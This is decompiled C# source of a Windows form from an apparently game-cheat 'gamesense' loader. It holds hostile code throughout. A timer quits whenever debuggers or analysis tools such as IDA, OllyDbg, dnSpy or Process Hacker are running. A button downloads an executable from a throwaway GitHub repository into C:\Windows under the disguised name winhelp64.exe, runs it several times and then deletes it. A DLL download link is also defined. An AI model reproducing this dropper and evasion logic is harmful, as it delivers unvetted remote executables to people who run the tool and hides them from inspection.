using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace gamesense
{
	// Token: 0x0200000E RID: 14
	public partial class Form2 : Form
	{
		// Token: 0x06000070 RID: 112
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000071 RID: 113
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000072 RID: 114 RVA: 0x001871AC File Offset: 0x00181FAC
		public Form2()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0018440B File Offset: 0x0017F20B
		private void Form2_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000074 RID: 116 RVA: 0x0018440D File Offset: 0x0017F20D
		private void Form2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Form2.ReleaseCapture();
				Form2.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00187234 File Offset: 0x00182034
		private void timer1_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("ida64");
			Process[] processesByName2 = Process.GetProcessesByName("ida32");
			Process[] processesByName3 = Process.GetProcessesByName("ollydbg");
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg64");
			Process[] processesByName5 = Process.GetProcessesByName("loaddll");
			Process[] processesByName6 = Process.GetProcessesByName("httpdebugger");
			Process[] processesByName7 = Process.GetProcessesByName("windowrenamer");
			Process[] processesByName8 = Process.GetProcessesByName("processhacker");
			Process[] processesByName9 = Process.GetProcessesByName("Process Hacker");
			Process[] processesByName10 = Process.GetProcessesByName("ProcessHacker");
			Process[] processesByName11 = Process.GetProcessesByName("HxD");
			Process[] processesByName12 = Process.GetProcessesByName("parsecd");
			Process[] processesByName13 = Process.GetProcessesByName("ida");
			Process[] processesByName14 = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0 || processesByName2.Length != 0 || processesByName3.Length != 0 || processesByName4.Length != 0 || processesByName5.Length != 0 || processesByName6.Length != 0 || processesByName7.Length != 0 || processesByName8.Length != 0 || processesByName9.Length != 0 || processesByName10.Length != 0 || processesByName11.Length != 0 || processesByName13.Length != 0 || processesByName12.Length != 0 || processesByName14.Length != 0)
			{
				Application.Exit();
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00184443 File Offset: 0x0017F243
		private void button1_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/zce8mgwWPc");
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00184450 File Offset: 0x0017F250
		private void button2_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCAR3YZ9Dnxn37uEbjod_QuA");
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00187364 File Offset: 0x00182164
		private void button5_Click(object sender, EventArgs e)
		{
			Form2.<button5_Click>d__17 <button5_Click>d__;
			<button5_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<button5_Click>d__.<>4__this = this;
			<button5_Click>d__.<>1__state = -1;
			<button5_Click>d__.<>t__builder.Start<Form2.<button5_Click>d__17>(ref <button5_Click>d__);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0018445D File Offset: 0x0017F25D
		private void button4_Click_1(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0018440B File Offset: 0x0017F20B
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0018440B File Offset: 0x0017F20B
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007C RID: 124 RVA: 0x0018440B File Offset: 0x0017F20B
		private void label3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007D RID: 125 RVA: 0x001873AC File Offset: 0x001821AC
		private void button3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\" + this.exe_name + ".exe";
			webClient.DownloadFile(this.exe_link, text);
			Task.Delay(10000);
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			if (this.bypass_array.Length != 0 && File.Exists(text))
			{
				File.Delete(text);
			}
		}

		// Token: 0x04000035 RID: 53
		private string dll_link = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/release.dll";

		// Token: 0x04000036 RID: 54
		private string dll_name = "d3d22";

		// Token: 0x04000037 RID: 55
		private string exe_name = "winhelp64";

		// Token: 0x04000038 RID: 56
		private string exe_link = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/Server_Crasher_community_servers.exe";

		// Token: 0x04000039 RID: 57
		private Process[] bypass_array = Process.GetProcessesByName("winhelp64");

		// Token: 0x0400003A RID: 58
		private int time_to_wait = 35000;

		// Token: 0x0400003B RID: 59
		private bool setted_up = true;

		// Token: 0x0400003C RID: 60
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x0400003D RID: 61
		public const int HT_CAPTION = 2;
	}
}
